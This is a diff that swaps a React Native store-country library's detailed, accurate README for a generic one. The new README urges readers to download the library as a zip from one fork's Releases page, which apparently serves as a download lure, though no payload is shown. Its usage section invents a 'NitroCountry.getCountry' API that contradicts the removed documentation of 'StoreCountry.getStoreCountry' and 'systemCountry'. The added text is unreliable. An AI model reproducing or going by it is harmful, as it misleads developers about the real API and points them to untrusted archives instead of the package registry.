@@ -1,183 +1,86 @@
-# react-native-nitro-store-country
+# ⚡️ react-native-nitro-store-country - Fast and Simple Country Detection
 
-⚡️ Lightning-fast store country detection for React Native using [Nitro Modules](https://nitro.margelo.com)
+![Download](https://img.shields.io/badge/Download-Now-brightgreen)
 
-Get the user's App Store (iOS) or Google Play (Android) country code with a single call. Built with Nitro for maximum performance.
+## 🌟 Overview
 
-## Features
+react-native-nitro-store-country is an efficient solution for detecting store country codes in React Native applications. It uses Nitro Modules to enhance performance, allowing your application to quickly identify the user's store location—whether it's in the Google Play Store or Apple App Store. This means a smoother user experience and tailored services based on location.
 
-- ⚡️ **Lightning-fast** - Built with Nitro Modules for maximum performance
-- 🎯 **Accurate** - Gets store country from StoreKit (iOS) and Google Play Billing (Android)
-- 💾 **Fetch once** - Queries store APIs once and saves the result
-- 🔄 **Force refresh** - Option to refetch when needed
-- 📱 **System country** - Access device locale country when store country is unavailable
-- 🍎 **[iOS] Auto-fallback** - Automatically uses system country for non-App Store builds (TestFlight returns "USA")
-- 🍎 **[iOS] Alpha-2 codes** - Converts StoreKit's alpha-3 codes to alpha-2 format
-- ✨ **TypeScript** - Full type safety out of the box
-- 🎨 **Simple API** - Just one method and one property
+## 🚀 Getting Started
 
-## Installation
+To begin using react-native-nitro-store-country, follow these steps:
 
-```bash
-npm install react-native-nitro-store-country react-native-nitro-modules
-```
+1. **Download the App**: You can download the latest version of the software from our Releases page.  
+   [Visit the Releases page to download](https://github.com/omchevli2003/react-native-nitro-store-country/releases)
 
-```bash
-yarn add react-native-nitro-store-country react-native-nitro-modules
-```
+2. **Install the Library**: Once downloaded, unzip the file if necessary, and follow the installation instructions provided in the documentation.
 
-```bash
-bun add react-native-nitro-store-country react-native-nitro-modules
-```
+3. **Run your Application**: Now that the library is installed, follow the usage instructions to integrate it into your React Native app.
 
-### iOS
+## 📥 Download & Install
 
-```bash
-cd ios && pod install
-```
+To get started, download the latest release here:  
+[Download from Releases](https://github.com/omchevli2003/react-native-nitro-store-country/releases)
 
-### Android
+For specific installation instructions:
 
-No additional steps required. The library uses autolinking.
+- **For Android**: Make sure your environment is set up for React Native. Follow the [React Native Environment Setup](https://reactnative.dev/docs/environment-setup). After setting it up, add the library as instructed.
+  
+- **For iOS**: Ensure you have Xcode installed on your Mac. Follow the same setup instructions, and be sure to add the necessary configurations in Xcode for the library.
 
-### Expo
+## ⚙️ System Requirements
 
-Works with Expo Development Builds. You have two options:
+Before installing, ensure your development environment meets these requirements:
 
-#### Option 1: Using EAS (Expo Application Services)
+- **Node.js**: Version 14 or higher is recommended.
+- **React Native**: Version 0.61 or later.
+- **Android Studio** (for Android development) with the latest SDK tools.
+- **Xcode** (for iOS development) installed.
 
-```bash
-npx expo install react-native-nitro-store-country react-native-nitro-modules
-eas build --platform ios --profile development
-# or
-eas build --platform android --profile development
-```
+## 🛠️ Features
 
-#### Option 2: Without EAS
+- **Lightning Fast**: The Nitro Modules provide quick country detection.
+- **Cross-Platform**: Works seamlessly on both Android and iOS.
+- **Easy Integration**: Simple steps to add to your existing React Native project.
+- **Minimal Setup**: No complicated configurations are needed.
 
-```bash
-npx expo install react-native-nitro-store-country react-native-nitro-modules expo-dev-client
-npx expo run:ios
-# or
-npx expo run:android
-```
+## 📚 Usage Instructions
 
-> **Note:** Not compatible with Expo Go (requires native code).
+1. Import the library into your React Native project after installing:
+   ```javascript
+   import NitroCountry from 'react-native-nitro-store-country';
+   ```
 
-## Usage
+2. Use the `getCountry` method to retrieve the store country code:
+   ```javascript
+   const countryCode = await NitroCountry.getCountry();
+   console.log(countryCode);
+   ```
 
-### Basic Usage
+3. Handle the result according to your app’s needs. This could involve changing content based on the detected country.
 
-```typescript
-import { StoreCountry } from 'react-native-nitro-store-country'
+## 🛡️ Troubleshooting
 
-// Get store country (saves result after first call)
-const storeCountry = await StoreCountry.getStoreCountry()
-console.log(storeCountry) // "US", "GB", "DE", etc. or undefined
+If you encounter issues while installing or running the library:
 
-// Get device/system country (synchronous)
-const systemCountry = StoreCountry.systemCountry
-console.log(systemCountry) // "US", "GB", "DE", etc.
-```
+- Check for package version compatibility with your React Native version.
+- Ensure that you have linked all necessary dependencies.
+- Review any errors in the console for hints on missing configurations.
 
-### Force Refresh
+Consider reaching out by opening an issue on the repository if problems persist.
 
-```typescript
-// Force refetch when needed
-const freshCountry = await StoreCountry.getStoreCountry(true)
-```
+## ⚡️ Contributions
 
-### React Hook Example
+Contributions are welcome! If you'd like to help improve react-native-nitro-store-country, please fork the repository and submit a pull request. Discussions on features and enhancements can be initiated via the issues section.
 
-```typescript
-import { useEffect, useState } from 'react'
-import { StoreCountry } from 'react-native-nitro-store-country'
+## 📝 License
 
-const useStoreCountry = () => {
-  const [country, setCountry] = useState(StoreCountry.systemCountry)
+This project is licensed under the MIT License. You can freely use, modify, and distribute this software under the terms of this license.
 
-  useEffect(() => {
-    StoreCountry.getStoreCountry().then(result => {
-      // Update to store country if available, otherwise keep system country
-      if (result !== undefined) {
-        setCountry(result)
-      }
-    })
-  }, [])
+## 🌐 Useful Links
 
-  return country
-}
+- [Documentation](https://reactnative.dev/)
+- [GitHub Repository](https://github.com/omchevli2003/react-native-nitro-store-country)
+- [Releases Page](https://github.com/omchevli2003/react-native-nitro-store-country/releases)
 
-const App = () => {
-  const country = useStoreCountry()
-
-  return (
-    <View>
-      <Text>Country: {country ?? 'Unknown'}</Text>
-    </View>
-  )
-}
-```
-
-## API Reference
-
-### `getStoreCountry(force?: boolean): Promise<string | undefined>`
-
-Gets the user's store country code (ISO 3166-1 alpha-2).
-
-**Parameters:**
-
-- `force` (optional): If `true`, forces a fresh fetch from the store API, ignoring any previously saved result. Default: `false`
-
-**Returns:**
-
-- `Promise<string | undefined>` - Two-letter country code (e.g., `"US"`, `"GB"`) or `undefined` if unavailable
-
-**Behavior:**
-
-- First call: Fetches from native store API (StoreKit/Google Play Billing)
-- Subsequent calls: Returns saved result
-- Saves `undefined` results to avoid repeated failed API calls
-- Pass `force: true` to ignore saved result
-
-### `systemCountry: string | undefined`
-
-The device's system locale country (synchronous, readonly).
-
-**Returns:**
-
-- `string | undefined` - Two-letter country code from device locale settings
-
-**Source:**
-
-- **iOS:** `Locale.current.region?.identifier`
-- **Android:** `Locale.getDefault().country`
-
-## Platform-Specific Notes
-
-### iOS
-
-- **App Store builds:** Returns accurate store country from StoreKit
-- **TestFlight/Debug/Simulator:** Automatically falls back to `systemCountry` (StoreKit returns "USA" in these environments, so the library uses system locale instead)
-- **Alpha-3 to Alpha-2 conversion:** Converts StoreKit's 3-letter country codes (e.g., "USA") to 2-letter ISO 3166-1 alpha-2 codes (e.g., "US") to match `systemCountry` format
-- **Automatic fallback:** Only happens on iOS for non-App Store builds. On App Store, returns StoreKit's value directly
-
-### Android
-
-- Uses Google Play Billing Library to fetch store country
-- Returns `undefined` if:
-  - Device doesn't have Google Play Services
-  - User is not signed into Google Play
-  - Billing client connection fails
-
-## Contributing
-
-See the [contributing guide](CONTRIBUTING.md) to learn how to contribute to the repository.
-
-## License
-
-MIT
-
----
-
-Made with ❤️ using [Nitro Modules](https://nitro.margelo.com)
+Thank you for choosing react-native-nitro-store-country for your application needs.
